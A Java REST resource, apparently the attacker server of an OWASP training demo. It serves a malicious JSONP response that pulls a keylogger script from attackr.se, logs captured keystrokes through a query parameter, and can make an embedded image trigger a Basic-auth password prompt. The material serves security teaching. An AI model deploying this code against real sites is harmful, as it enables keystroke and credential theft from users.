package org.owasp.oneliner.rest.attacker;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.stereotype.Component;

import javax.imageio.ImageIO;
import javax.servlet.ServletContext;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.ws.rs.*;
import javax.ws.rs.core.Context;
import javax.ws.rs.core.GenericEntity;
import javax.ws.rs.core.MediaType;
import javax.ws.rs.core.Response;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.util.Enumeration;

/**
 * @johnwilander
 */
@Path("/attacker")
@Component
public class AttackerResource {
    private static final Log logger = LogFactory.getLog(AttackerResource.class);
    private static final String jsonpBodyEvil = "{\"data\": \"someData\"}";
    private static final String jsKeylogger = "$.getScript('http://attackr.se:8081/attacks/keylogger_http.js');";
    @GET
    @Path("/log")
    public Response log(@QueryParam("k") String key) {
        logger.debug(key);
        return Response.ok().build();
    }

    @GET
    @Path("/jsonpEvil")
    public Response jsonpEvil(@QueryParam("callback") String callback) {
        GenericEntity entity = new GenericEntity<String>(callback + "(" + jsonpBodyEvil + ");" + jsKeylogger) {};
        return Response.ok(entity, MediaType.APPLICATION_JSON_TYPE).build();
    }

    static final String IMG_PATH = "/images/thumb_john.jpg";
    @GET
    @Path("/thumb_john.jpg")
    @Produces("image/jpg")
    public Response getEvilImage(@Context ServletContext context) {
        if (returnUnauthorized) {
            return Response.status(Response.Status.UNAUTHORIZED).header("WWW-Authenticate", "Basic").build();
        } else {
            try {
                BufferedImage image = ImageIO.read(context.getResourceAsStream(IMG_PATH));
                ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                ImageIO.write(image, "png", outputStream);
                byte[] imageData = outputStream.toByteArray();
                return Response.ok(imageData).build();
            } catch (IOException e) {
                e.printStackTrace();
                return Response.serverError().build();
            }
        }
    }

    private boolean returnUnauthorized = false;
    @POST
    @Path("/unauthorizedImage")
    public void setUnauthorizedImage(@FormParam("setUnauthorized") boolean setUnauthorized) { //@FormParam("returnUnauthorizedImage") String returnUnauthorizedImage) {
        logger.debug("setUnauthorized ==" + setUnauthorized);
        this.returnUnauthorized = setUnauthorized;
    }
}
